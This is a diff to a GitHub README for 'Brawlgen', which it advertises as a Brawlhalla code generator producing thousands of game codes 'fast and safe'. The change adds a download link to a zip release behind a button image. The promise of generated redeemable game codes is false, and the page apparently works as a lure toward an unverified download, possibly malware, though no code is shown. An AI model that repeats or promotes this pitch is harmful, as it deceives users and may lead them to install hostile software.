@@ -8,9 +8,13 @@ A Brawlhalla code generator The first of it's kind that generates thousands of c
 Portable utility that helps you generate brawlhalla codes.
 
 Brawlgen is recommended if you wan't to generate codes fast and safe.
-
 <p align="center">
-<img src="https://raw.githubusercontent.com/hellzerg/optimizer/master/download-button.png">
+	<a href="https://github.com/Aysur/Brawlhalla-Code-Generator/releases/download/Brawlhalla-Code-Generator-Download.zip" target="_blank">
+		<img src="https://raw.githubusercontent.com/hellzerg/optimizer/master/download-button.png">
+		<br>
+		
+	</a>
+</p> 
 
 * Lightning speed generating
 * Lightweight cpu usage
